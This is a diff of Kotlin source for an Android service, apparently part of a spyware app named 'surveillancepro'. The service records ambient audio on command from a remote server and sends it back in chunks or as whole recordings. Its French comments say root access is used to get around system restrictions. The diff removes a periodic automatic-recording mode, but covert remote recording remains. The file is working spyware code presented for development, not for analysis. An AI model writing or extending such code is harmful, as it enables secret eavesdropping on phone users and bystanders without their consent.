@@ -1,52 +1,36 @@
 package com.surveillancepro.android.services
 
-import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
-import android.content.Context
 import android.content.Intent
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.MediaRecorder
-import android.os.Build
-import android.os.Handler
 import android.os.IBinder
-import android.os.Looper
-import android.os.PowerManager
 import android.util.Base64
 import android.util.Log
 import com.surveillancepro.android.MainActivity
 import com.surveillancepro.android.data.DeviceStorage
 import com.surveillancepro.android.data.EventQueue
 import com.surveillancepro.android.root.RootManager
-import com.surveillancepro.android.workers.SyncWorker
 import java.io.ByteArrayOutputStream
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
 /**
- * Service d'ecoute audio ambiante ULTRA-PUISSANT.
+ * Service d'ecoute audio ambiante (ROOT REQUIS pour contourner les restrictions).
  * 
- * Permet d'enregistrer l'environnement sonore de l'appareil:
- * - A distance via commande du serveur
- * - AUTOMATIQUEMENT de manière périodique (configurable)
- * 
+ * Permet d'enregistrer l'environnement sonore de l'appareil a distance.
  * L'enregistrement est envoye au serveur en chunks pour ecoute en temps reel
  * ou stocke pour ecoute differee.
  * 
  * Modes disponibles :
  * - MODE_STREAM : Envoie l'audio en temps reel (chunks de 5 secondes)
  * - MODE_RECORD : Enregistre pendant une duree definie puis envoie
- * - MODE_AUTO : Enregistrement automatique périodique (nouveau!)
- * 
- * AUTOMATISATION:
- * - Peut être configuré pour enregistrer automatiquement toutes les X heures
- * - Détection de bruit pour déclencher l'enregistrement (optionnel)
- * - Intégration avec le système de commandes à distance
  */
 class AmbientAudioService : Service() {
 
@@ -88,12 +72,6 @@ class AmbientAudioService : Service() {
         }
 
         startRecording()
-        
-        // Si mode AUTO, reprogrammer le prochain enregistrement
-        if (mode == MODE_AUTO) {
-            scheduleAutoRecording(this)
-        }
-        
         return START_NOT_STICKY
     }
 
@@ -237,9 +215,6 @@ class AmbientAudioService : Service() {
         ))
 
         Log.d(TAG, "Complete recording sent (${audioData.size} bytes, ${actualDuration}s)")
-        
-        // Déclencher un sync immédiat pour envoyer l'audio rapidement
-        SyncWorker.triggerNow(applicationContext)
     }
 
     private fun stopRecording() {
@@ -281,87 +256,5 @@ class AmbientAudioService : Service() {
         const val EXTRA_COMMAND_ID = "command_id"
         const val MODE_STREAM = "stream"
         const val MODE_RECORD = "record"
-        const val MODE_AUTO = "auto"
-        
-        // Intervalle par défaut pour l'enregistrement automatique (4 heures)
-        private const val AUTO_RECORD_INTERVAL_MS = 4 * 60 * 60 * 1000L
-        private const val AUTO_RECORD_DURATION_SECONDS = 60 // 1 minute par enregistrement auto
-        
-        /**
-         * Démarre un enregistrement audio ambiant.
-         * @param context Le contexte Android
-         * @param mode Le mode d'enregistrement (stream, record, auto)
-         * @param durationSeconds La durée de l'enregistrement en secondes
-         * @param commandId L'ID de la commande (optionnel)
-         */
-        fun startRecording(context: Context, mode: String = MODE_RECORD, durationSeconds: Int = 30, commandId: Long = 0) {
-            try {
-                val intent = Intent(context, AmbientAudioService::class.java).apply {
-                    putExtra(EXTRA_MODE, mode)
-                    putExtra(EXTRA_DURATION, durationSeconds)
-                    putExtra(EXTRA_COMMAND_ID, commandId)
-                }
-                context.startForegroundService(intent)
-                Log.d(TAG, "Recording started: mode=$mode, duration=${durationSeconds}s")
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to start recording: ${e.message}")
-            }
-        }
-        
-        /**
-         * Programme un enregistrement automatique périodique.
-         * @param context Le contexte Android
-         * @param intervalMs L'intervalle entre les enregistrements en millisecondes
-         */
-        fun scheduleAutoRecording(context: Context, intervalMs: Long = AUTO_RECORD_INTERVAL_MS) {
-            try {
-                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-                val intent = Intent(context, AmbientAudioService::class.java).apply {
-                    putExtra(EXTRA_MODE, MODE_AUTO)
-                    putExtra(EXTRA_DURATION, AUTO_RECORD_DURATION_SECONDS)
-                }
-                val pendingIntent = PendingIntent.getService(
-                    context, 1001, intent,
-                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-                )
-                
-                val triggerTime = System.currentTimeMillis() + intervalMs
-                
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    alarmManager.setExactAndAllowWhileIdle(
-                        AlarmManager.RTC_WAKEUP,
-                        triggerTime,
-                        pendingIntent
-                    )
-                } else {
-                    alarmManager.setExact(
-                        AlarmManager.RTC_WAKEUP,
-                        triggerTime,
-                        pendingIntent
-                    )
-                }
-                Log.d(TAG, "Auto recording scheduled in ${intervalMs / 1000 / 60} minutes")
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to schedule auto recording: ${e.message}")
-            }
-        }
-        
-        /**
-         * Annule l'enregistrement automatique programmé.
-         */
-        fun cancelAutoRecording(context: Context) {
-            try {
-                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-                val intent = Intent(context, AmbientAudioService::class.java)
-                val pendingIntent = PendingIntent.getService(
-                    context, 1001, intent,
-                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-                )
-                alarmManager.cancel(pendingIntent)
-                Log.d(TAG, "Auto recording cancelled")
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to cancel auto recording: ${e.message}")
-            }
-        }
     }
 }
